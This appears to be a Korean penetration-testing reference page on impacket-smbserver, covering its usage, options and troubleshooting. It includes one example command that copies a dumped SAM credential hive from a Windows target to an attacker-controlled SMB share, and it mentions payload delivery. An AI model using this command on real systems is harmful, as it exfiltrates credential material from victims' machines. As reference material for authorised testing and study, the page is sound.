---
tags:
  - 서비스/smb
  - 기능/파일전송
실행환경: ["Linux"]
필요권한: ["TCP/445 bind 권한", "공유 디렉터리 읽기 또는 쓰기 권한"]
필요조건: ["share 이름과 공유할 로컬 디렉터리"]
결과: ["파일", "SMB 공유"]
---

# impacket-smbserver

## 도구 개요

`impacket-smbserver`는 로컬 디렉터리를 임시 SMB 공유로 제공하는 Impacket 서버 도구다. Windows와 파일을 주고받거나 클라이언트의 SMB 연결·인증 시도를 관찰해야 할 때 간단한 전송 지점으로 사용하기 좋다.

## 필요한 입력과 실행 환경

- 실행 위치: Windows/Linux client가 TCP/445로 접근할 수 있는 Linux 호스트
- 필요한 입력: share 이름과 노출할 로컬 디렉터리
- 환경별 입력: SMB2 지원 여부와 필요하면 share 사용자명/비밀번호; 로컬 방화벽과 포트 점유를 확인한다.


## 표준 사용법

```bash
impacket-smbserver <share_name> <share_path> [options]
```

## 대표 예시

### 인증 없는 임시 SMB share 생성

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

### 인증이 필요한 SMB share 생성

```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support -username test -password test
```

### Windows 대상에서 공격자 share로 파일 복사

```cmd
copy C:\Windows\Temp\sam.save \\<attacker_ip>\share\sam.save
```

## 주요 옵션

| 옵션 | 설명 |
| --- | --- |
| `-smb2support` | SMB2 지원 활성화 |
| `-username`, `-password` | share 접근 인증 설정 |
| `-ip` | 바인딩할 로컬 IP 지정 |
| `-port` | 수신 포트 지정 |
| `-debug` | 디버그 출력 |


## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| Windows 대상에서 share 접근 성공 | 공격자 호스트 SMB share 연결 가능 | 파일 다운로드/업로드, payload 전달, 출력 파일 회수에 사용 |
| 클라이언트 연결 로그 | 대상이 SMB로 접속함 | 인증 여부와 요청 파일 경로 확인 |
| 인증/guest 오류 | Windows 정책 또는 SMB 설정 문제 | `-smb2support`, 사용자/비밀번호 옵션, guest 정책 확인 |
| 연결 안 됨 | 방화벽, 라우팅, 포트 바인딩 문제 | 공격자 IP, TCP/445 listen, 대상 outbound SMB 가능 여부 확인 |
| 파일 복사 실패 | 경로/권한 문제 | share 이름, 파일명 quoting, 읽기/쓰기 권한 확인 |
| SMB 버전 문제 | SMB1/SMB2 호환성 | `-smb2support` 사용 여부 확인 |

## 관련 공격기법

- [[상황별 파일 전송]]
- [[Windows SAM SECURITY SYSTEM 덤프]]
